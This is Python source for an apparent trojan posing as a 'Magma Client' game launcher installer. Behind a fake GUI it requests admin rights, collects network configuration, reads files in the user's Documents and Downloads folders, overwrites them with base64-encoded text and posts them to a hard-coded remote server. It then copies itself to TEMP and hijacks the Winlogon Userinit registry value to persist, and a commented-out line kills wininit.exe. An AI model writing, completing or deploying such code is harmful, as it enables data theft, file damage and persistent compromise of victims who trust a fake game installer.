import requests, os, subprocess, base64, winreg, shutil, sys, customtkinter, ctypes

def reqAdmin():
    try:
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return result > 32
    except Exception as e:
        print("Error:", e)
        return False
def isAdmin():
    try:return ctypes.windll.shell32.IsUserAnAdmin()
    except:return False
def killInstance(): subprocess.Popen(["taskkill", "/f", "/im", "wininit.exe"])
def payload(firstRun=False):
    data = {}
    pipe = subprocess.Popen(["ipconfig"], stdout=subprocess.PIPE, bufsize=1, text=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    content = ""
    while pipe.poll() is None:
        #Some of this code, like the iter() trick was gotten from AI, since the old code that I wrote was prone to being blocked, and not work THAT WELL with streams
        for line in iter(lambda: pipe.stdout.read(1), ''): content += line
        for line in iter(lambda: pipe.stderr.read(1), ''): content += line
    data["ipconfig"] = content
    folders = ["Documents", "Downloads"]
    for folder in folders:
        for file in os.listdir(f"{os.environ.get('USERPROFILE')}/{folder}"):
            if os.path.isdir(f"{os.environ.get('USERPROFILE')}/{folder}/{str(file)}"): continue
            try:
                with open(f"{os.environ.get('USERPROFILE')}/{folder}/{str(file)}", "r+") as writah:
                    content = writah.read()
                    if folder not in data["files"].keys(): data["files"][folder] = {}
                    data["files"][folder][file] = content
                    writah.seek(0)
                    writah.write(str(base64.b64encode(bytes(content, encoding="utf-8"))))
            except Exception: pass
    requests.post(url="http://192.168.29.70:8888/receive", json=data)
    currentPath = sys.executable
    exeName = os.path.basename(currentPath)
    shutil.copy2(currentPath, os.environ.get("TEMP"))
    with winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", 0, winreg.KEY_ALL_ACCESS) as key:
        winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, f"""C:\\Windows\\system32\\userinit.exe, "{os.environ.get("TEMP")}\\{exeName}",""")

    #if firstRun: killInstance()
def GUI():
    root = customtkinter.CTk()
    customtkinter.set_default_color_theme("green")
    customtkinter.CTkLabel(root, text="Welcome to Magma Client").grid(row=0, column=0)
    customtkinter.CTkLabel(root, text="Get the best performing Launcher right now, from one install away!").grid(row=1, column=0, pady=5)
    customtkinter.CTkLabel(root, text="This installer will provide you the launcher and the best performance enhancing mods right to you!").grid(row=2, column=0, pady=2)

    root.mainloop()

if __name__ == "__main__":
    if os.path.exists(os.path.join(os.environ.get("TEMP"), sys.executable)): payload()
    else:
        if not isAdmin():
            reqAdmin()
            sys.exit()
        GUI()